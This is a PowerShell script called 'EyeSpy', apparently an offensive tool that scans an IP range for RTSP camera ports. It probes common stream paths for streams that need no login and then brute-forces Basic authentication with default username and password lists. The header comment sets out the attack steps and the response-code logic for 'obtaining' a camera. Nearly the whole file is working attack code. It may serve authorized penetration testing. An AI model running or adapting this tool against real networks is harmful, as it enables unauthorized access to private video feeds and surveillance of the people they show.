<#
Attack Path: Find Port -> Find AuthType -> Find Creds -> Find Path

Request For Basic Auth admin:admin

$request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
"CSeq: 2$CRLF" +
"Authorization: Basic YWRtaW46YWRtaW4=$CRLF$CRLF"

$user = "username"
$pass = "password"
$authString = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$user:$pass"))
Write-Output $authString


If it's a 401 or 403, it means that the credentials are wrong but the route might be okay.
If it's a 404, it means that the route is incorrect but the credentials might be okay.
If it's a 200, the stream is accessed successfully.

Step 1: Scan all routes with no credentials, look for 200, if found, No-Auth - Camera Obtained
Step 2: Check for 404 results and dont scan that route again - its wrong
Step 3: Of the 401 and 403 routes, Attempt credential attack, look for 200 again
Step 4: If nothing else is found, then Credentials and Route not found, attack failed.

Roll in Early Termination of 200 requests.

#>

function EyeSpy {

    [CmdletBinding(DefaultParameterSetName = 'Default')]
    Param(
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Scan,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$FullAuto,

        #[Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        #[int]$Threads = 50,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [Switch]$Help

    )

    if ($Help) {

        $HelpOutput = @("
[ Help ] ================================================

                    EyeSpy 
                    by: Miiden

=========================================================
 
 Example Usage:

 EyeSpy -Scan 192.168.0.1/24
 Eyespy -FullAuto 192.168.0.1/24

=========================================================
")

        $HelpOutput | Write-Output
        return

    }

    $Banner = @("
=========================================================
                
=========================================================
         _______             _______             
        |    ___.--.--.-----|     __.-----.--.--.
        |    ___|  |  |  -__|__     |  _  |  |  |
        |_______|___  |_____|_______|   __|___  |
                |_____|             |__|  |_____|   
                                               
=========================================================
                By: Miiden
=========================================================
    ")

    if (!$Scan -and !$FullAuto) {
    
        Write-Host
        Write-Host "[!] " -ForegroundColor "Red" -NoNewline
        Write-Host "You must provide either -Scan or -FullAuto"
    
        Write-Host "[!] " -ForegroundColor "Red" -NoNewline
        Write-Host "Run ""EyeSpy -Help"" for command line usage"
        Write-Host
    
        return
    
    }

$Banner

function Get-IpRange {
        [CmdletBinding(ConfirmImpact = 'None')]
        Param(
            [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
            [string[]] $Target
        )

        process {
            $Computers = @()
            foreach ($subnet in $Target) {
                if ($subnet -match '^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$') {
                    # Treat as a single IP address
                    $Computers += $subnet
                }
                elseif ($subnet -match '^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}/\b(1[6-9]|2[0-9]|3[0-2])\b$') {
                    # CIDR notation processing
                    $IP = ($subnet -split '\/')[0]
                    [int]$SubnetBits = ($subnet -split '\/')[1]
                    if ($SubnetBits -lt 16 -or $SubnetBits -gt 30) {
                        Write-Warning -Message 'Enter a CIDR value between 16 and 30'
                        return
                    }
                    $Octets = $IP -split '\.'
                    $IPInBinary = @()
                    foreach ($Octet in $Octets) {
                        $OctetInBinary = [convert]::ToString($Octet, 2).PadLeft(8, '0')
                        $IPInBinary += $OctetInBinary
                    }
                    $IPInBinary = $IPInBinary -join ''
                    $HostBits = 32 - $SubnetBits
                    $NetworkIDInBinary = $IPInBinary.Substring(0, $SubnetBits)
                    $HostIDInBinary = '0' * $HostBits
                    $imax = [convert]::ToInt32(('1' * $HostBits), 2) - 1 # -1 to remove broadcast address
                    For ($i = 1; $i -le $imax; $i++) {
                        $NextHostIDInDecimal = $i
                        $NextHostIDInBinary = [convert]::ToString($NextHostIDInDecimal, 2).PadLeft($HostBits, '0')
                        $NextIPInBinary = $NetworkIDInBinary + $NextHostIDInBinary
                        $IP = @()
                        For ($x = 0; $x -lt 4; $x++) {
                            $StartCharNumber = $x * 8
                            $IPOctetInBinary = $NextIPInBinary.Substring($StartCharNumber, 8)
                            $IPOctetInDecimal = [convert]::ToInt32($IPOctetInBinary, 2)
                            $IP += $IPOctetInDecimal
                        }
                        $IP = $IP -join '.'
                        $Computers += $IP
                    }
                }
                else {
                    Write-Host -ForegroundColor red "Value`: [$subnet] is not in a valid format"
                    return
                }
            }
            # Remember: Only returns an IP list, not active hosts.
            return $Computers
        }
}



function PortScan {
        [CmdletBinding(ConfirmImpact = 'None')]
        Param(
            [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
            [string[]] $Target
        ) 

    $Ports = @(554, 8554, 5554)
    $Timeout = 300
    $AlivePorts = @()

    $scriptBlock = {
        
        param ($Target, $Timeout, $Port)
        
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $asyncResult = $tcpClient.BeginConnect($Target, $Port, $null, $null)
        $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    if ($tcpClient.Connected) {
                        #Port Open
                        $tcpClient.Close()
                        return "$Target`:$Port"
                    }
                }
                catch {
                    #Errorhandling Catch
                    $tcpClient.Close()
                    return "Error with Connection"
                }
            }
            else {
                #Port Closed
                $tcpClient.Close()
                return "Error with Connection"
            }
        }

        foreach ($Computer in $Target) {
            foreach ($Port in $Ports){
                $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Timeout).AddArgument($Port)
                $runspace.RunspacePool = $runspacePool

                [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $Computer
                    Port         = $Port
                    Completed    = $false
                })
            }   
        }
}


function Async-Runspaces {
        [CmdletBinding(ConfirmImpact = 'None')]
        Param(
            [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
            [string[]] $Target,
            [Parameter(Mandatory, ValueFromPipeline, Position = 1)]
            [string[]] $Option

        )     
        $Threads = 50
        $Timeout = 300
        $ReturnedResult = @()
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        if ($Option -eq "PortScan"){
            PortScan -Target $Target
        } elseif ($Option -eq "AttackCamera"){
            AttackCamera -Targets $Target
        } elseif ($Option -eq "AuthAttack"){
            AuthAttack -Targets $Target
        }

        # Poll the runspaces and display results as they complete
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
                if ($runspace.Handle.IsCompleted) {
                    
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()

                    if ($result -eq "Error with Connection"){
                        continue
                    }
                    elseif($Option -eq "PortScan") {
                        Write-Host -ForegroundColor Green "$result"
                        $ReturnedResult += $result

                    }elseif($Option -eq "AttackCamera") {
                        $concat = $result[0] + ":"+ $result[1] + "/" + $result[2]
                        if ($result[3] -eq "200"){
                            #Checking for No Authentication on all Paths
                            Write-Host -ForegroundColor Green "No Authentication Required:" $concat

                        } elseif ($result[3] -eq "401" -or $result[3] -eq "403"){
                            #Find any 401's or 403's for Authentication BruteForcing
                            Write-Host -ForegroundColor Yellow $result[3] $concat
                            $ReturnedResult += $concat
                        
                        } else {
                            #Should catch any other status codes including 404
                            #Debugging line
                            #Write-Host -NoNewline -ForegroundColor Yellow $result[0]  $result[2] $result[3]
                            continue
                        }

                    }elseif ($Option -eq "AuthAttack") {
                        Write-Host -ForegroundColor Green "$result"
                        #$ReturnedResult += $result
                        
                        }

                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        # Clean up
        $runspacePool.Close()
        $runspacePool.Dispose()
        return $ReturnedResult
}


function AttackCamera {
    [CmdletBinding(ConfirmImpact = 'None')]
    Param(
        [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
        [string[]] $Targets
    ) 

    $Paths = @("", "MyPath", "MyScan", "axis/camera", "11/01", "MyStream")
    $Timeout = 300

    $scriptBlock = {
        
        param ($IP, $Timeout, $Port, $Path)

            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($IP, $Port, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)

                if ($wait) { 
                    try {
                        $tcpClient.EndConnect($asyncResult)
                        if ($tcpClient.Connected) {
                            #Port Open
                            $Stream = $tcpClient.GetStream()
                            $Reader = New-Object System.IO.StreamReader($Stream)
                            $Reader.BaseStream.ReadTimeout = $Timeout
                            $Writer = New-Object System.IO.StreamWriter($Stream)

                            $CRLF = [char]13 + [char]10  # Carriage Return + Line Feed
                            $request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
                                       "CSeq: 2$CRLF$CRLF" #+
                                       #"Authorization: Basic YWRtaW46YWRtaW4=$CRLF$CRLF"


                            $Writer.Write($request)
                            $Writer.Flush()

                            $response = ''
                            try {
                                Start-Sleep -Milliseconds 100
                                while ($Stream.CanRead) {
                                        $line = $Reader.ReadLine()
                                    if ($line -eq $null) { break }
                                        $response += $line + $CRLF
                                }
                            } catch [System.IO.IOException] {
                                # Catching the exception without taking any action
            
                                # Debugging: Handle timeout or connection closed gracefully
                                #Write-Host "Error reading response: $_"
                            }

                            # Extract the status code from the first line
                            $statusLine = $response.Split([Environment]::NewLine)[0]
                            $statusCode = ($statusLine -split ' ')[1].Trim()

                            $tcpClient.Close()
                            return @($IP, $Port, $Path, $statusCode)
                        }
                    }
                    catch {
                        #Errorhandling Catch
                        Write-Host "Error Handling"
                        $tcpClient.Close()
                        return "Error with Connection"
                    }
                }
                else {
                    #Port Closed
                    Write-Host "Port Closed"
                    $tcpClient.Close()
                    return "Error with Connection"
                }
            }
        
        foreach ($Target in $Targets) {

            $IP = ($Target -split ':')[0]
            [int]$Port = ($Target -split ':')[1]

            foreach ($Path in $Paths) {
                $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($IP).AddArgument($Timeout).AddArgument($Port).AddArgument($Path)
                $runspace.RunspacePool = $runspacePool
                  
                [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $IP
                    Port         = $Port
                    Path         = $Path
                    Completed    = $false
                })
            }   
        }



}


function AuthAttack {
    [CmdletBinding(ConfirmImpact = 'None')]
    Param(
        [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
        [string[]] $Targets
    ) 

    $UserList = @("root","admin","administrator")
    $PassList = @("root","admin", "password")
    $Timeout = 300

    $scriptBlock = {
        
        param ($IP, $Timeout, $Port, $Path, $authString)

            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($IP, $Port, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)

                if ($wait) { 
                    try {
                        $tcpClient.EndConnect($asyncResult)
                        if ($tcpClient.Connected) {
                            #Port Open
                            $Stream = $tcpClient.GetStream()
                            $Reader = New-Object System.IO.StreamReader($Stream)
                            $Reader.BaseStream.ReadTimeout = $Timeout
                            $Writer = New-Object System.IO.StreamWriter($Stream)

                            $CRLF = [char]13 + [char]10  # Carriage Return + Line Feed
                            $request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
                                       "CSeq: 2$CRLF" +
                                       "Authorization: Basic $authString$CRLF$CRLF"

                            $Writer.Write($request)
                            $Writer.Flush()

                            $response = ''
                            try {
                                Start-Sleep -Milliseconds 100
                                while ($Stream.CanRead) {
                                        $line = $Reader.ReadLine()
                                    if ($line -eq $null) { break }
                                        $response += $line + $CRLF
                                }
                            } catch [System.IO.IOException] {
                                # Catching the exception without taking any action
            
                                # Debugging: Handle timeout or connection closed gracefully
                                #Write-Host "Error reading response: $_"
                            }

                            #Debugging Line:
                            $tcpClient.Close()
                            return $response
                        }
                    }
                    catch {
                        #Errorhandling Catch
                        Write-Host "Error Handling"
                        $tcpClient.Close()
                        return "Error with Connection"
                    }
                }
                else {
                    #Port Closed
                    Write-Host "Port Closed"
                    $tcpClient.Close()
                    return "Error with Connection"
                }
            }
        
        foreach ($Target in $Targets) {

            $IP, $Port, $Paths = $Target -split "[:/]", 3

            foreach ($Path in $Paths) {
                foreach($Username in $UserList){
                    foreach($Password in $PassList){
                        $authString = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$Username`:$Password"))
                        $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($IP).AddArgument($Timeout).AddArgument($Port).AddArgument($Path).AddArgument($authString)
                        $runspace.RunspacePool = $runspacePool
                  
                        [void]$runspaces.Add([PSCustomObject]@{
                            Runspace     = $runspace
                            Handle       = $runspace.BeginInvoke()
                            Auth         = $authString
                            ComputerName = $IP
                            Port         = $Port
                            Path         = $Path
                            Completed    = $false
                        })
                    }
                }
            }   
        }



}


[array]$AlivePorts = @()

    if ($Scan){

        $IpAddr = Get-IpRange -Target $Scan
        $AlivePorts += Async-Runspaces -Target $IpAddr -Option "PortScan"
    
        if ($AlivePorts.Length -eq 0){  
            Write-Host -ForegroundColor Red "No Devices with open RTSP ports were found on the target address/range."
            Write-Host $AlivePorts
            return
        }
        $AlivePorts
   
        return
    }

    if ($FullAuto){
        $IpAddr = Get-IpRange -Target $FullAuto
        $AlivePorts += Async-Runspaces -Target $IpAddr -Option "PortScan"

        if ($AlivePorts){ 
            Start-Sleep -Milliseconds 500
            $PathsToAttack = Async-Runspaces -Target $AlivePorts -Option "AttackCamera"
            if ($PathsToAttack){
                #Run the AuthAttack function
                Async-Runspaces -Target $PathsToAttack -Option "AuthAttack"
            } else {
                Write-Host -ForegroundColor Red "No Potential Paths were found to Attack."
            }

        } else {
            Write-Host -ForegroundColor Red "No Devices with open RTSP ports were found on the target address/range."
            Write-Host $AlivePorts
        }
        return
    }



}

#return #[pscustomobject]@{ Address = $IP; Port = $port; Open = $open }
